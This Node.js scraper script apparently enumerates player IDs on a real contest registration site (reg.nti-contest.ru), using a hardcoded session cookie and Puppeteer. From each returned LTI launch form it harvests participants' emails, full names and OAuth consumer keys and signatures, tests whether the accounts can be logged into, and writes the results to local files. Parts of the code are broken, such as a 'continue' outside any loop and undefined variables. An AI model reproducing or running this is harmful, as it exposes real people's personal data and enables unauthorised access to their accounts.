const fs = require('fs')

const nodeFetch = require('node-fetch');
const tough = require('tough-cookie');
const puppeteer = require('puppeteer')

var cookiejar = new tough.CookieJar();
cookiejar.setCookieSync("AIOHTTP_SESSION=2772e16f0f42479bb1a2cb3dec43f9c7", 'https://reg.nti-contest.ru/api/reg_stepik_acc');

const fetch = require('fetch-cookie')(nodeFetch, cookiejar)



const ids = require('./ids5854.js');
const personal = require('./personal.js');
const all = require('./all.js');

//const getAllLoginable = require('getLoginable.js')


const delay = (ms) => {
    return new Promise((res, rej) => {
        setTimeout(res, ms)
    })
}

checkAllURLs();

async function checkAllURLs() {
    let len = ids.length
    const browserOptions = {
        headless: true,
        ignoreHTTPSErrors: true,
        args: ['--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-infobars',
            //'--window-position=0,0',
            '--ignore-certifcate-errors',
            '--ignore-certifcate-errors-spki-list',
            //'--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3312.0 Safari/537.36"',
        ],
        defaultViewport: {
            width: 1280,
            height: 600,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: false
        }
    }
    const browser = await puppeteer.launch(browserOptions);
    const page = await browser.newPage();
    await page.setCookie({ "name": "AIOHTTP_SESSION", "value": "2772e16f0f42479bb1a2cb3dec43f9c7", "domain": "reg.nti-contest.ru", "path": "/", "expires": -1, "size": 19, "httpOnly": false, "secure": false, "session": false })
    for (let i = len; i >= 0; i--) {
        console.log(`id: ${len-i}`)
        //await delay(1000);
        let {content, isLoginable} = await checkURL(page, ids[i], 5);
        console.log(isLoginable)
        oldScript(content, isLoginable);
    }

    fs.writeFile('./all2.js', `module.exports = ${JSON.stringify(all, null, 2)};`, "utf8", (err, data) => {
        if (err) {
            console.error(err)
        }
    });
    fs.writeFile('./personal2.js', `module.exports = ${JSON.stringify(personal, null, 2)};`, "utf8", (err, data) => {
        if (err) {
            console.error(err)
        }
    });
}
async function checkURL(page, id, speciallyID) {
    await page.goto(`https://reg.nti-contest.ru/api/reg_stepik_acc?player_id=${id}&speciality_id=${speciallyID}`);
    const content = await page.content();
    console.log(content)
    await page.waitFor('form>button')
    await page.click('form>button')
    await page.waitForNavigation({waitUntil:120000});
    const check = await page.$('sign-form__btn button_with-loader')
    let isLoginable = false
    if(check!==null){
        isLoginable = true
    }
    return {content:content, isLoginable:isLoginable}
}


async function checkURLOld(id, speciallyID) {
    return await fetch(`https://reg.nti-contest.ru/api/reg_stepik_acc?player_id=${id}&speciality_id=${speciallyID}`, {
            "headers": {},
            "referrerPolicy": "no-referrer-when-downgrade",
            "body": null,
            "method": "GET",
            "mode": "cors"
        }).then(res => res.text())
        .catch(res => res.text())
}



async function oldScript(res, isLoginable) {
    if(res.match(/lis_person_contact_email_primary" value="(.*?)"/)===null)continue;
        console.log(`id: ${len-i}`)
        resultPersonal = {
            email: res.match(/lis_person_contact_email_primary" value="(.*?)"/)[1],
            name: res.match(/lis_person_name_full" value="(.*?)"/)[1]
        }
        console.log(resultPersonal.email)
        resultAll = {
            id:id,
            isLoginable: isLoginable,
            lti_version: res.match(/lti_version" value="(.*?)"/)[1],
            resource_link_id: res.match(/resource_link_id" value="(.*?)"/)[1],
            lis_person_contact_email_primary: res.match(/lis_person_contact_email_primary" value="(.*?)"/)[1],
            lis_person_name_full: res.match(/lis_person_name_full" value="(.*?)"/)[1],
            custom_course: res.match(/custom_course" value="(.*?)"/)[1],
            oauth_nonce: res.match(/oauth_nonce" value="(.*?)"/)[1],
            oauth_timestamp: res.match(/oauth_timestamp" value="(.*?)"/)[1],
            oauth_version: res.match(/oauth_version" value="(.*?)"/)[1],
            oauth_signature_method: res.match(/oauth_signature_method" value="(.*?)"/)[1],
            oauth_consumer_key: res.match(/oauth_consumer_key" value="(.*?)"/)[1],
            oauth_signature: res.match(/oauth_signature" value="(.*?)"/)[1]
        }
        personal.push(resultPersonal);
        all.push(resultAll);

        if(isLoginable===true){
            all.push(resultAll);
        }
        fs.appendFile('.res2', res + '\n'+resultAll+'\n', "utf8", (err, data) => {
            if (err) {
                console.error(err)
            }
        });
}




